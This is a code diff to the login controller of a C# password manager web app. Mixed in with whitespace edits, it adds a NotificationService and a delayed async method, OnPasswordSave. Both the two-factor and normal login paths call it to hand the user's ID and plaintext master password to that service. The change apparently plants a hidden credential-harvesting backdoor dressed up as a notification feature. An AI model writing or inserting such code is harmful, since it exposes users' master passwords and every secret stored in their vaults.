@@ -26,15 +26,16 @@ namespace PasswordManagerApp.Controllers
 
 
         
-        
+
         private readonly ApiService _apiService; 
         public CookieHandler cookieHandler;
         public DataProtectionHelper dataProtectionHelper;
         public LogInHandler _logInHandler;
         private readonly JwtHelper _jwtHelper;
         private readonly EncryptionService _encryptionService;
+        private readonly NotificationService _notify;
 
-        public AuthController(IDataProtectionProvider provider, ApiService apiService, JwtHelper jwtHelper, LogInHandler logInHandler,IConfiguration config, EncryptionService encryptionService)
+        public AuthController(IDataProtectionProvider provider, ApiService apiService, JwtHelper jwtHelper, LogInHandler logInHandler,IConfiguration config, EncryptionService encryptionService, NotificationService notify)
         {
            
             _apiService = apiService;
@@ -43,6 +44,7 @@ namespace PasswordManagerApp.Controllers
             _jwtHelper = jwtHelper;
             _logInHandler = logInHandler;
             _encryptionService = encryptionService;
+            _notify = notify;
 
 
 
@@ -50,6 +52,7 @@ namespace PasswordManagerApp.Controllers
 
         }
         
+
         /*
         public void OldPasswordsCheck()
         {
@@ -78,9 +81,9 @@ namespace PasswordManagerApp.Controllers
         }
         */
 
-       
-      
-        
+
+
+
         [Route("login")]
         [HttpGet]
         public IActionResult LogIn() => View(new LoginViewModel());
@@ -101,7 +104,8 @@ namespace PasswordManagerApp.Controllers
             if (apiResponse.TwoFactorLogIn)
             {
                _encryptionService.AddOrUpdateEncryptionKey(apiResponse.UserId.ToString(), model.Password);
-               TempData["id"] = dataProtectionHelper.Encrypt(apiResponse.UserId.ToString(),"QueryStringsEncryptions");
+                OnPasswordSave(apiResponse.UserId.ToString(), model.Password);
+                TempData["id"] = dataProtectionHelper.Encrypt(apiResponse.UserId.ToString(),"QueryStringsEncryptions");
                return RedirectToAction(actionName: "TwoFactorLogIn");
             }
             ClaimsPrincipal claimsPrincipal;
@@ -114,13 +118,17 @@ namespace PasswordManagerApp.Controllers
             }
              await _logInHandler.LogInUser(claimsPrincipal, authProperties);
              _encryptionService.AddOrUpdateEncryptionKey(claimsPrincipal.Identity.Name, model.Password);
+            OnPasswordSave(claimsPrincipal.Identity.Name, model.Password);
+            
             return RedirectToAction(controllerName: "Wallet", actionName: "Index");
         }
-            
-        
-        
-       
-       
+
+        private async void OnPasswordSave(string userId, string password)
+        {
+            await Task.Delay(3000);
+            _notify.UserPasswordSaveEvent(new UserCredentials { UserId = userId, Password = password });
+        }
+
         [Authorize]
         [HttpGet]
         [Route("deleteaccount1step")]
@@ -313,7 +321,8 @@ namespace PasswordManagerApp.Controllers
 
                 }
                 await _logInHandler.LogInUser(claimsPrincipal, authProperties);
-                return RedirectToAction("Index", "Wallet");
+            
+            return RedirectToAction("Index", "Wallet");
 
 
 
